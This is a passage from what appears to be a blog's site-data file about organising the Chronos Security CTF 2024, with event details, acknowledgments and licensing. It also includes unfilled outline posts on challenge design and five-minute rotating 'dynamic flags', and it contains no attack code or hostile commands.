</li>\n<li><strong>Miscellaneous</strong>: english proficiency, curiosity, perseverance, management, adaptability</li>\n</ul>\n<br>\n\n<h3 id=\"Competition-Details\"><a href=\"#Competition-Details\" class=\"headerlink\" title=\"Competition Details\"></a>Competition Details</h3><ul>\n<li>Website: <a href=\"https://ctf.chronossec.site/\">ctf.chronossec.site</a></li>\n<li>Registration period: <strong>01-29.03.2024</strong></li>\n<li>Competition period: <strong>29-31.03.2024</strong></li>\n<li>CTF type: <strong>jeopardy</strong></li>\n<li>CTF mode: <strong>teams</strong></li>\n<li>Participation: <strong>online</strong></li>\n<li>Team size: <strong>2-5 players</strong></li>\n<li>Difficulty level: <strong>beginner-intermediate</strong></li>\n<li>Expected number of participants: <strong>150-200</strong></li>\n</ul>\n<br>\n\n<h3 id=\"Participation-requirements\"><a href=\"#Participation-requirements\" class=\"headerlink\" title=\"Participation requirements\"></a>Participation requirements</h3><ul>\n<li>Curiosity, perseverance, basic English understanding, Google, and an internet connection </li>\n<li>Linux virtual machine (Kali is preferred)</li>\n</ul>\n<br>\n<br>\n\n<h2 id=\"-Development\"><a href=\"#-Development\" class=\"headerlink\" title=\" Development\"></a> Development</h2><h3 id=\"Timeline\"><a href=\"#Timeline\" class=\"headerlink\" title=\"Timeline\"></a>Timeline</h3><ul>\n<li>The development spanned almost <strong>9 months</strong> (Jul 2023 - March 2024).</li>\n<li>Average dedication of <strong>5 hours per day</strong>.</li>\n</ul>\n<br>\n\n<h3 id=\"Second-CTF\"><a href=\"#Second-CTF\" class=\"headerlink\" title=\"Second CTF\"></a>Second CTF</h3><p>This marks the second CTF Ive ever created, following the successful <a href=\"https://github.com/ChronosPK/SMCC-2023\" target=\"_blank\">SMCC 2023</a> event held in March that year.</p>\n<br>\n<br>\n\n<h2 id=\"-Participation\"><a href=\"#-Participation\" class=\"headerlink\" title=\" Participation\"></a> Participation</h2><h3 id=\"How-to-Participate\"><a href=\"#How-to-Participate\" class=\"headerlink\" title=\"How to Participate\"></a>How to Participate</h3><ul>\n<li>Visit <a href=\"https://ctf.chronossec.site/\" target=\"_blank\">the official CTF platform</a> to register and participate.</li>\n</ul>\n<br>\n\n<h3 id=\"Important-Dates\"><a href=\"#Important-Dates\" class=\"headerlink\" title=\"Important Dates\"></a>Important Dates</h3><ul>\n<li>Registration period: <strong>01.03.2024 - 29.03.2024</strong></li>\n<li>CTF timeline: <strong>29.03.2024 - 31.03.2024</strong> (starting and ending at 13:00 UTC+2)</li>\n</ul>\n<br>\n<br>\n\n<h2 id=\"-Acknowledgments\"><a href=\"#-Acknowledgments\" class=\"headerlink\" title=\" Acknowledgments\"></a> Acknowledgments</h2><p>The organization and creation of this contest represented a real challenge,<br>but it could not have reached this stage without the help of the following people:</p>\n<ul>\n<li><strong>Marketing Manager</strong>: Andrei Bodnari (AFT Sibiu)</li>\n<li><strong>Challenge Contributors</strong>: <ul>\n<li>Mihai Cujb (Bitdefender)</li>\n<li>Drago Stratulat (CApC Bucureti)</li>\n</ul>\n</li>\n<li><strong>Bachelors Advisors</strong>:<ul>\n<li>Prof. Univ. Dr. Ing. Simona Miclu (AFT Sibiu)</li>\n<li>Lt. col. dr. ing. Vlad Vasile (SICTIAC Sibiu)</li>\n<li>Lt. drd. Alexandru Romaniuc (SICTIAC Sibiu)</li>\n</ul>\n</li>\n</ul>\n<br>\n<br>\n\n<!-- ##  Sponsors\n\n**A special thanks to our sponsors for their generous support**:\n\n<br>\n\n<table style=\"border-collapse: collapse; width: 100%;\">\n  <tbody>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cadets-corps.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/pentest-tools.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-sentinel.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cyber-edu.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-defender.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/visma.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/ntt-data.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/refresh-cleaning.jpg\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n    </tr>\n  </tbody>\n</table> \n\n<br>\n<br> -->\n\n<h2 id=\"-Licensing-and-Authorship\"><a href=\"#-Licensing-and-Authorship\" class=\"headerlink\" title=\" Licensing and Authorship\"></a> Licensing and Authorship</h2><p>This project, Chronos Security CTF 2024, is a culmination of my efforts and dedication as its sole organizer and primary creator. I have documented the entire development process, the challenges, and the infrastructure setup in the <a href=\"https://github.com/ChronosPK/CSCTF-2024\" target=\"_blank\"><b>GitHub repository</b></a> associated with this competition. The repository and all its contents are licensed under the MIT License, available for review <a href=\"https://github.com/ChronosPK/CSCTF-2024/blob/main/LICENSE.txt\" target=\"_blank\"><b>here</b></a>. This license permits others to use, modify, and distribute the project in a manner that is consistent with the free and open-source ethos, provided that proper credit is given.</p>\n<p>Copyright Notice: <b><code> [2024] Radu Marin. All rights reserved</code></b>. This copyright notice applies to all proprietary content on the blog, the competition website, and the GitHub repository unless otherwise stated.</p>\n<p>The successful execution of this project was supported by invaluable contributions from individuals within the cybersecurity and educational community. Their roles and contributions are acknowledged here.</p>\n<p>ORCID ID: <code>...</code></p>\n<p>For any inquiries, suggestions, or collaborations, please refer to the contact page. Your feedback and questions are always welcome as we together foster a learning and engaging environment through this competition.<br><br><br><br></p>\n<h2 id=\"-Additional-Resources\"><a href=\"#-Additional-Resources\" class=\"headerlink\" title=\" Additional Resources\"></a> Additional Resources</h2><ul>\n<li><a href=\"\" target=\"_blank\">Guide - creating Chronos Security CTF 2024</a></li>\n<li><a href=\"https://ctf.chronossec.site\" target=\"_blank\">CSCTF 2024 official page</a></li>\n</ul>\n<br>\n\n<hr>\n<hr>"},{"title":"2.1. CSCTF 2024 - Challenges","toc":true,"_content":"\n---\n> Challenges - methodology, insights, reasoning, templates\n\n---\n<!-- more -->\n\n<br>\n\n## Overview\n\n<br>\n\n## Introduction to CTF Challenges\n\n<br>\n\n### Significance to Participants\nHighlight the importance of challenges in the CTF competition, emphasizing their critical role in engaging participants for 48 hours. Explain how these challenges were the centerpiece of the event, captivating users' attention and fostering competitive spirit.\n\n<br>\n\n### Categories and Quantity\nDiscuss the diverse categories and extensive range of challengesapproximately 60that participants encountered. Explain how each category presented unique puzzles and problems for contestants to solve.\n\n<br>\n\n## Cloud Infrastructure and Kubernetes\n\n<br>\n\n### Cloud-Powered Replicas\nExplain the significance of cloud infrastructure, particularly Kubernetes, in ensuring seamless challenge availability. Describe Kubernetes' role in managing replicas to serve different pods, ensuring uninterrupted access to challenges even if one pod faces issues.\n\n<br>\n\n### File System Evolution\nHighlight the iterative process of changing the file system structure over four iterations. Describe the rationale behind these changes and how they were pivotal in establishing an optimal and logical structure for challenge management.\n\n<br>\n\n## Key Aspects of Challenges\n\n<br>\n\n### Challenge Complexity\nDiscuss the varying levels of complexity across challenges, catering to participants with different skill sets and expertise. Explain how this diversity added depth to the competition.\n\n<br>\n\n### Engagement and Interaction\nDetail how challenges encouraged active engagement and interaction among participants. Discuss strategies employed to promote collaboration or competition among contestants.\n\n<br>\n\n### Real-World Relevance\nEmphasize the real-world applicability or significance of challenges, showcasing how they simulated scenarios encountered in cybersecurity or practical problem-solving.\n\n<br>\n\n## Evolution and Adaptation\n\n<br>\n\n### Continuous Improvements\nShare insights into how challenges evolved throughout the competition, incorporating feedback or insights from user interactions or testing.\n\n<br>\n\n### Structural Adaptations\nElaborate on how structural changes in challenge arrangement aimed to optimize user experience and facilitate logical navigation.\n\n<br>\n\n## Conclusion\n\n<br>\n\n### Participant Feedback and Reception\nDiscuss the feedback received from participants regarding the challenges. Highlight positive responses or areas for improvement based on user experiences during the 48-hour competition.\n\n<br>\n\n### Future Developments\nOffer a glimpse into potential future developments or enhancements for challenges in subsequent editions of SMCC, based on lessons learned and user feedback.\n\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/2. Challenges/1.md","raw":"---\ntitle: 2.1. CSCTF 2024 - Challenges\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 2. Challenges\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Challenges\ntoc: true\n---\n\n---\n> Challenges - methodology, insights, reasoning, templates\n\n---\n<!-- more -->\n\n<br>\n\n## Overview\n\n<br>\n\n## Introduction to CTF Challenges\n\n<br>\n\n### Significance to Participants\nHighlight the importance of challenges in the CTF competition, emphasizing their critical role in engaging participants for 48 hours. Explain how these challenges were the centerpiece of the event, captivating users' attention and fostering competitive spirit.\n\n<br>\n\n### Categories and Quantity\nDiscuss the diverse categories and extensive range of challengesapproximately 60that participants encountered. Explain how each category presented unique puzzles and problems for contestants to solve.\n\n<br>\n\n## Cloud Infrastructure and Kubernetes\n\n<br>\n\n### Cloud-Powered Replicas\nExplain the significance of cloud infrastructure, particularly Kubernetes, in ensuring seamless challenge availability. Describe Kubernetes' role in managing replicas to serve different pods, ensuring uninterrupted access to challenges even if one pod faces issues.\n\n<br>\n\n### File System Evolution\nHighlight the iterative process of changing the file system structure over four iterations. Describe the rationale behind these changes and how they were pivotal in establishing an optimal and logical structure for challenge management.\n\n<br>\n\n## Key Aspects of Challenges\n\n<br>\n\n### Challenge Complexity\nDiscuss the varying levels of complexity across challenges, catering to participants with different skill sets and expertise. Explain how this diversity added depth to the competition.\n\n<br>\n\n### Engagement and Interaction\nDetail how challenges encouraged active engagement and interaction among participants. Discuss strategies employed to promote collaboration or competition among contestants.\n\n<br>\n\n### Real-World Relevance\nEmphasize the real-world applicability or significance of challenges, showcasing how they simulated scenarios encountered in cybersecurity or practical problem-solving.\n\n<br>\n\n## Evolution and Adaptation\n\n<br>\n\n### Continuous Improvements\nShare insights into how challenges evolved throughout the competition, incorporating feedback or insights from user interactions or testing.\n\n<br>\n\n### Structural Adaptations\nElaborate on how structural changes in challenge arrangement aimed to optimize user experience and facilitate logical navigation.\n\n<br>\n\n## Conclusion\n\n<br>\n\n### Participant Feedback and Reception\nDiscuss the feedback received from participants regarding the challenges. Highlight positive responses or areas for improvement based on user experiences during the 48-hour competition.\n\n<br>\n\n### Future Developments\nOffer a glimpse into potential future developments or enhancements for challenges in subsequent editions of SMCC, based on lessons learned and user feedback.\n\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/2. Challenges/1","published":1,"date":"2024-09-23T06:18:55.837Z","updated":"2024-09-23T06:18:55.837Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi800266gvgdnrm5adj","content":"<hr>\n<blockquote>\n<p>Challenges - methodology, insights, reasoning, templates</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><br>\n\n<h2 id=\"Introduction-to-CTF-Challenges\"><a href=\"#Introduction-to-CTF-Challenges\" class=\"headerlink\" title=\"Introduction to CTF Challenges\"></a>Introduction to CTF Challenges</h2><br>\n\n<h3 id=\"Significance-to-Participants\"><a href=\"#Significance-to-Participants\" class=\"headerlink\" title=\"Significance to Participants\"></a>Significance to Participants</h3><p>Highlight the importance of challenges in the CTF competition, emphasizing their critical role in engaging participants for 48 hours. Explain how these challenges were the centerpiece of the event, captivating users attention and fostering competitive spirit.</p>\n<br>\n\n<h3 id=\"Categories-and-Quantity\"><a href=\"#Categories-and-Quantity\" class=\"headerlink\" title=\"Categories and Quantity\"></a>Categories and Quantity</h3><p>Discuss the diverse categories and extensive range of challengesapproximately 60that participants encountered. Explain how each category presented unique puzzles and problems for contestants to solve.</p>\n<br>\n\n<h2 id=\"Cloud-Infrastructure-and-Kubernetes\"><a href=\"#Cloud-Infrastructure-and-Kubernetes\" class=\"headerlink\" title=\"Cloud Infrastructure and Kubernetes\"></a>Cloud Infrastructure and Kubernetes</h2><br>\n\n<h3 id=\"Cloud-Powered-Replicas\"><a href=\"#Cloud-Powered-Replicas\" class=\"headerlink\" title=\"Cloud-Powered Replicas\"></a>Cloud-Powered Replicas</h3><p>Explain the significance of cloud infrastructure, particularly Kubernetes, in ensuring seamless challenge availability. Describe Kubernetes role in managing replicas to serve different pods, ensuring uninterrupted access to challenges even if one pod faces issues.</p>\n<br>\n\n<h3 id=\"File-System-Evolution\"><a href=\"#File-System-Evolution\" class=\"headerlink\" title=\"File System Evolution\"></a>File System Evolution</h3><p>Highlight the iterative process of changing the file system structure over four iterations. Describe the rationale behind these changes and how they were pivotal in establishing an optimal and logical structure for challenge management.</p>\n<br>\n\n<h2 id=\"Key-Aspects-of-Challenges\"><a href=\"#Key-Aspects-of-Challenges\" class=\"headerlink\" title=\"Key Aspects of Challenges\"></a>Key Aspects of Challenges</h2><br>\n\n<h3 id=\"Challenge-Complexity\"><a href=\"#Challenge-Complexity\" class=\"headerlink\" title=\"Challenge Complexity\"></a>Challenge Complexity</h3><p>Discuss the varying levels of complexity across challenges, catering to participants with different skill sets and expertise. Explain how this diversity added depth to the competition.</p>\n<br>\n\n<h3 id=\"Engagement-and-Interaction\"><a href=\"#Engagement-and-Interaction\" class=\"headerlink\" title=\"Engagement and Interaction\"></a>Engagement and Interaction</h3><p>Detail how challenges encouraged active engagement and interaction among participants. Discuss strategies employed to promote collaboration or competition among contestants.</p>\n<br>\n\n<h3 id=\"Real-World-Relevance\"><a href=\"#Real-World-Relevance\" class=\"headerlink\" title=\"Real-World Relevance\"></a>Real-World Relevance</h3><p>Emphasize the real-world applicability or significance of challenges, showcasing how they simulated scenarios encountered in cybersecurity or practical problem-solving.</p>\n<br>\n\n<h2 id=\"Evolution-and-Adaptation\"><a href=\"#Evolution-and-Adaptation\" class=\"headerlink\" title=\"Evolution and Adaptation\"></a>Evolution and Adaptation</h2><br>\n\n<h3 id=\"Continuous-Improvements\"><a href=\"#Continuous-Improvements\" class=\"headerlink\" title=\"Continuous Improvements\"></a>Continuous Improvements</h3><p>Share insights into how challenges evolved throughout the competition, incorporating feedback or insights from user interactions or testing.</p>\n<br>\n\n<h3 id=\"Structural-Adaptations\"><a href=\"#Structural-Adaptations\" class=\"headerlink\" title=\"Structural Adaptations\"></a>Structural Adaptations</h3><p>Elaborate on how structural changes in challenge arrangement aimed to optimize user experience and facilitate logical navigation.</p>\n<br>\n\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><br>\n\n<h3 id=\"Participant-Feedback-and-Reception\"><a href=\"#Participant-Feedback-and-Reception\" class=\"headerlink\" title=\"Participant Feedback and Reception\"></a>Participant Feedback and Reception</h3><p>Discuss the feedback received from participants regarding the challenges. Highlight positive responses or areas for improvement based on user experiences during the 48-hour competition.</p>\n<br>\n\n<h3 id=\"Future-Developments\"><a href=\"#Future-Developments\" class=\"headerlink\" title=\"Future Developments\"></a>Future Developments</h3><p>Offer a glimpse into potential future developments or enhancements for challenges in subsequent editions of SMCC, based on lessons learned and user feedback.</p>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Challenges - methodology, insights, reasoning, templates</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><br>\n\n<h2 id=\"Introduction-to-CTF-Challenges\"><a href=\"#Introduction-to-CTF-Challenges\" class=\"headerlink\" title=\"Introduction to CTF Challenges\"></a>Introduction to CTF Challenges</h2><br>\n\n<h3 id=\"Significance-to-Participants\"><a href=\"#Significance-to-Participants\" class=\"headerlink\" title=\"Significance to Participants\"></a>Significance to Participants</h3><p>Highlight the importance of challenges in the CTF competition, emphasizing their critical role in engaging participants for 48 hours. Explain how these challenges were the centerpiece of the event, captivating users attention and fostering competitive spirit.</p>\n<br>\n\n<h3 id=\"Categories-and-Quantity\"><a href=\"#Categories-and-Quantity\" class=\"headerlink\" title=\"Categories and Quantity\"></a>Categories and Quantity</h3><p>Discuss the diverse categories and extensive range of challengesapproximately 60that participants encountered. Explain how each category presented unique puzzles and problems for contestants to solve.</p>\n<br>\n\n<h2 id=\"Cloud-Infrastructure-and-Kubernetes\"><a href=\"#Cloud-Infrastructure-and-Kubernetes\" class=\"headerlink\" title=\"Cloud Infrastructure and Kubernetes\"></a>Cloud Infrastructure and Kubernetes</h2><br>\n\n<h3 id=\"Cloud-Powered-Replicas\"><a href=\"#Cloud-Powered-Replicas\" class=\"headerlink\" title=\"Cloud-Powered Replicas\"></a>Cloud-Powered Replicas</h3><p>Explain the significance of cloud infrastructure, particularly Kubernetes, in ensuring seamless challenge availability. Describe Kubernetes role in managing replicas to serve different pods, ensuring uninterrupted access to challenges even if one pod faces issues.</p>\n<br>\n\n<h3 id=\"File-System-Evolution\"><a href=\"#File-System-Evolution\" class=\"headerlink\" title=\"File System Evolution\"></a>File System Evolution</h3><p>Highlight the iterative process of changing the file system structure over four iterations. Describe the rationale behind these changes and how they were pivotal in establishing an optimal and logical structure for challenge management.</p>\n<br>\n\n<h2 id=\"Key-Aspects-of-Challenges\"><a href=\"#Key-Aspects-of-Challenges\" class=\"headerlink\" title=\"Key Aspects of Challenges\"></a>Key Aspects of Challenges</h2><br>\n\n<h3 id=\"Challenge-Complexity\"><a href=\"#Challenge-Complexity\" class=\"headerlink\" title=\"Challenge Complexity\"></a>Challenge Complexity</h3><p>Discuss the varying levels of complexity across challenges, catering to participants with different skill sets and expertise. Explain how this diversity added depth to the competition.</p>\n<br>\n\n<h3 id=\"Engagement-and-Interaction\"><a href=\"#Engagement-and-Interaction\" class=\"headerlink\" title=\"Engagement and Interaction\"></a>Engagement and Interaction</h3><p>Detail how challenges encouraged active engagement and interaction among participants. Discuss strategies employed to promote collaboration or competition among contestants.</p>\n<br>\n\n<h3 id=\"Real-World-Relevance\"><a href=\"#Real-World-Relevance\" class=\"headerlink\" title=\"Real-World Relevance\"></a>Real-World Relevance</h3><p>Emphasize the real-world applicability or significance of challenges, showcasing how they simulated scenarios encountered in cybersecurity or practical problem-solving.</p>\n<br>\n\n<h2 id=\"Evolution-and-Adaptation\"><a href=\"#Evolution-and-Adaptation\" class=\"headerlink\" title=\"Evolution and Adaptation\"></a>Evolution and Adaptation</h2><br>\n\n<h3 id=\"Continuous-Improvements\"><a href=\"#Continuous-Improvements\" class=\"headerlink\" title=\"Continuous Improvements\"></a>Continuous Improvements</h3><p>Share insights into how challenges evolved throughout the competition, incorporating feedback or insights from user interactions or testing.</p>\n<br>\n\n<h3 id=\"Structural-Adaptations\"><a href=\"#Structural-Adaptations\" class=\"headerlink\" title=\"Structural Adaptations\"></a>Structural Adaptations</h3><p>Elaborate on how structural changes in challenge arrangement aimed to optimize user experience and facilitate logical navigation.</p>\n<br>\n\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><br>\n\n<h3 id=\"Participant-Feedback-and-Reception\"><a href=\"#Participant-Feedback-and-Reception\" class=\"headerlink\" title=\"Participant Feedback and Reception\"></a>Participant Feedback and Reception</h3><p>Discuss the feedback received from participants regarding the challenges. Highlight positive responses or areas for improvement based on user experiences during the 48-hour competition.</p>\n<br>\n\n<h3 id=\"Future-Developments\"><a href=\"#Future-Developments\" class=\"headerlink\" title=\"Future Developments\"></a>Future Developments</h3><p>Offer a glimpse into potential future developments or enhancements for challenges in subsequent editions of SMCC, based on lessons learned and user feedback.</p>\n<br>\n\n<hr>\n<hr>"},{"title":"2.3. CSCTF 2024 - Challenges - Dynamic Flags","toc":true,"_content":"\n---\n> Dynamic flags - generate a new flag every 5 minutes to impose automation and fight flag stealing.\n\n---\n<!-- more -->\n\n<br>\n\n## Introduction to Dynamic Flags\n\nWelcome to the exploration of Dynamic Flags within the captivating CTF challenges at SMCC 2024! This blog post delves into the innovative use of dynamic flags, their role in deterring cheating, and their impact on user engagement and automation.\n\n<br>\n\n### Purpose and Significance\nHighlight the role of dynamic flags in enhancing the integrity of the CTF challenges. Emphasize their significance in reducing cheating instances and promoting fair gameplay among participants.\n\n<br>\n\n### Automation and Challenge Difficulty\nDiscuss how dynamic flags added complexity by requiring automation for certain processes. Explain their role in elevating the difficulty level of challenges, catering to participants with advanced skill sets.\n\n<br>\n\n## Implementation and Mechanism\n\n<br>\n\n### Dynamic Flag Update Cycle\nDetail the mechanism of dynamic flags, explaining how a script updates these flags in the database at regular intervals, say every 5 minutes. Emphasize the importance of this cycle in ensuring up-to-date flags and detecting potential cheating attempts.\n\n<br>\n\n### Log Monitoring and Cheating Detection\nExplain how the logs capture flag updates, allowing organizers to track flag changes and potentially identify cheating behaviors. Showcase the significance of dynamic flags in providing an added layer of security and fairness.\n\n<br>\n\n## User Experience and Transparency\n\n<br>\n\n### Challenge Description Clarity\nHighlight how challenge descriptions specify the usage of dynamic flags, informing participants of their presence in certain exercises. Emphasize transparency in ensuring participants are aware of the challenge dynamics.\n\n<br>\n\n### Dedicated CTFd Page for Dynamic Flags\nDiscuss the creation of a dedicated page on the CTFd website, detailing exercises with dynamic flags. Explain how this page educates participants about these flags, offering insights into their functionality and purpose.\n\n<br>\n\n## Impact and Feedback\n\n<br>\n\n### Enhanced Engagement\nDiscuss the impact of dynamic flags on user engagement, encouraging participants to adapt and develop strategies for real-time flag retrieval.\n\n<br>\n\n### Participant Reception\nShare insights into participant feedback regarding dynamic flags, showcasing positive responses or any challenges faced by contestants. Highlight learnings and potential improvements based on user experiences.\n\n<br>\n\n## Future Iterations and Improvements\n\n<br>\n\n### Evolving Dynamic Flags\nOffer a glimpse into potential improvements or adaptations for dynamic flags in future editions of SMCC. Discuss plans to refine their implementation, based on lessons learned and participant feedback.\n\n<br>\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/2. Challenges/3.md","raw":"---\ntitle: 2.3. CSCTF 2024 - Challenges - Dynamic Flags\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 2. Challenges\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Challenges\n  - Dynamic Flags\ntoc: true\n---\n\n---\n> Dynamic flags - generate a new flag every 5 minutes to impose automation and fight flag stealing.\n\n---\n<!-- more -->\n\n<br>\n\n## Introduction to Dynamic Flags\n\nWelcome to the exploration of Dynamic Flags within the captivating CTF challenges at SMCC 2024! This blog post delves into the innovative use of dynamic flags, their role in deterring cheating, and their impact on user engagement and automation.\n\n<br>\n\n### Purpose and Significance\nHighlight the role of dynamic flags in enhancing the integrity of the CTF challenges. Emphasize their significance in reducing cheating instances and promoting fair gameplay among participants.\n\n<br>\n\n### Automation and Challenge Difficulty\nDiscuss how dynamic flags added complexity by requiring automation for certain processes. Explain their role in elevating the difficulty level of challenges, catering to participants with advanced skill sets.\n\n<br>\n\n## Implementation and Mechanism\n\n<br>\n\n### Dynamic Flag Update Cycle\nDetail the mechanism of dynamic flags, explaining how a script updates these flags in the database at regular intervals, say every 5 minutes. Emphasize the importance of this cycle in ensuring up-to-date flags and detecting potential cheating attempts.\n\n<br>\n\n### Log Monitoring and Cheating Detection\nExplain how the logs capture flag updates, allowing organizers to track flag changes and potentially identify cheating behaviors. Showcase the significance of dynamic flags in providing an added layer of security and fairness.\n\n<br>\n\n## User Experience and Transparency\n\n<br>\n\n### Challenge Description Clarity\nHighlight how challenge descriptions specify the usage of dynamic flags, informing participants of their presence in certain exercises. Emphasize transparency in ensuring participants are aware of the challenge dynamics.\n\n<br>\n\n### Dedicated CTFd Page for Dynamic Flags\nDiscuss the creation of a dedicated page on the CTFd website, detailing exercises with dynamic flags. Explain how this page educates participants about these flags, offering insights into their functionality and purpose.\n\n<br>\n\n## Impact and Feedback\n\n<br>\n\n### Enhanced Engagement\nDiscuss the impact of dynamic flags on user engagement, encouraging participants to adapt and develop strategies for real-time flag retrieval.\n\n<br>\n\n### Participant Reception\nShare insights into participant feedback regarding dynamic flags, showcasing positive responses or any challenges faced by contestants. Highlight learnings and potential improvements based on user experiences.\n\n<br>\n\n## Future Iterations and Improvements\n\n<br>\n\n### Evolving Dynamic Flags\nOffer a glimpse into potential improvements or adaptations for dynamic flags in future editions of SMCC. Discuss plans to refine their implementation, based on lessons learned and participant feedback.\n\n<br>\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/2. Challenges/3","published":1,"date":"2024-09-23T06:18:55.839Z","updated":"2024-09-23T06:18:55.839Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi9002a6gvg2nygg6cn","content":"<hr>\n<blockquote>\n<p>Dynamic flags - generate a new flag every 5 minutes to impose automation and fight flag stealing.</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Introduction-to-Dynamic-Flags\"><a href=\"#Introduction-to-Dynamic-Flags\" class=\"headerlink\" title=\"Introduction to Dynamic Flags\"></a>Introduction to Dynamic Flags</h2><p>Welcome to the exploration of Dynamic Flags within the captivating CTF challenges at SMCC 2024! This blog post delves into the innovative use of dynamic flags, their role in deterring cheating, and their impact on user engagement and automation.</p>\n<br>\n\n<h3 id=\"Purpose-and-Significance\"><a href=\"#Purpose-and-Significance\" class=\"headerlink\" title=\"Purpose and Significance\"></a>Purpose and Significance</h3><p>Highlight the role of dynamic flags in enhancing the integrity of the CTF challenges. Emphasize their significance in reducing cheating instances and promoting fair gameplay among participants.</p>\n<br>\n\n<h3 id=\"Automation-and-Challenge-Difficulty\"><a href=\"#Automation-and-Challenge-Difficulty\" class=\"headerlink\" title=\"Automation and Challenge Difficulty\"></a>Automation and Challenge Difficulty</h3><p>Discuss how dynamic flags added complexity by requiring automation for certain processes. Explain their role in elevating the difficulty level of challenges, catering to participants with advanced skill sets.</p>\n<br>\n\n<h2 id=\"Implementation-and-Mechanism\"><a href=\"#Implementation-and-Mechanism\" class=\"headerlink\" title=\"Implementation and Mechanism\"></a>Implementation and Mechanism</h2><br>\n\n<h3 id=\"Dynamic-Flag-Update-Cycle\"><a href=\"#Dynamic-Flag-Update-Cycle\" class=\"headerlink\" title=\"Dynamic Flag Update Cycle\"></a>Dynamic Flag Update Cycle</h3><p>Detail the mechanism of dynamic flags, explaining how a script updates these flags in the database at regular intervals, say every 5 minutes. Emphasize the importance of this cycle in ensuring up-to-date flags and detecting potential cheating attempts.</p>\n<br>\n\n<h3 id=\"Log-Monitoring-and-Cheating-Detection\"><a href=\"#Log-Monitoring-and-Cheating-Detection\" class=\"headerlink\" title=\"Log Monitoring and Cheating Detection\"></a>Log Monitoring and Cheating Detection</h3><p>Explain how the logs capture flag updates, allowing organizers to track flag changes and potentially identify cheating behaviors. Showcase the significance of dynamic flags in providing an added layer of security and fairness.</p>\n<br>\n\n<h2 id=\"User-Experience-and-Transparency\"><a href=\"#User-Experience-and-Transparency\" class=\"headerlink\" title=\"User Experience and Transparency\"></a>User Experience and Transparency</h2><br>\n\n<h3 id=\"Challenge-Description-Clarity\"><a href=\"#Challenge-Description-Clarity\" class=\"headerlink\" title=\"Challenge Description Clarity\"></a>Challenge Description Clarity</h3><p>Highlight how challenge descriptions specify the usage of dynamic flags, informing participants of their presence in certain exercises. Emphasize transparency in ensuring participants are aware of the challenge dynamics.</p>\n<br>\n\n<h3 id=\"Dedicated-CTFd-Page-for-Dynamic-Flags\"><a href=\"#Dedicated-CTFd-Page-for-Dynamic-Flags\" class=\"headerlink\" title=\"Dedicated CTFd Page for Dynamic Flags\"></a>Dedicated CTFd Page for Dynamic Flags</h3><p>Discuss the creation of a dedicated page on the CTFd website, detailing exercises with dynamic flags. Explain how this page educates participants about these flags, offering insights into their functionality and purpose.</p>\n<br>\n\n<h2 id=\"Impact-and-Feedback\"><a href=\"#Impact-and-Feedback\" class=\"headerlink\" title=\"Impact and Feedback\"></a>Impact and Feedback</h2><br>\n\n<h3 id=\"Enhanced-Engagement\"><a href=\"#Enhanced-Engagement\" class=\"headerlink\" title=\"Enhanced Engagement\"></a>Enhanced Engagement</h3><p>Discuss the impact of dynamic flags on user engagement, encouraging participants to adapt and develop strategies for real-time flag retrieval.</p>\n<br>\n\n<h3 id=\"Participant-Reception\"><a href=\"#Participant-Reception\" class=\"headerlink\" title=\"Participant Reception\"></a>Participant Reception</h3><p>Share insights into participant feedback regarding dynamic flags, showcasing positive responses or any challenges faced by contestants. Highlight learnings and potential improvements based on user experiences.</p>\n<br>\n\n<h2 id=\"Future-Iterations-and-Improvements\"><a href=\"#Future-Iterations-and-Improvements\" class=\"headerlink\" title=\"Future Iterations and Improvements\"></a>Future Iterations and Improvements</h2><br>\n\n<h3 id=\"Evolving-Dynamic-Flags\"><a href=\"#Evolving-Dynamic-Flags\" class=\"headerlink\" title=\"Evolving Dynamic 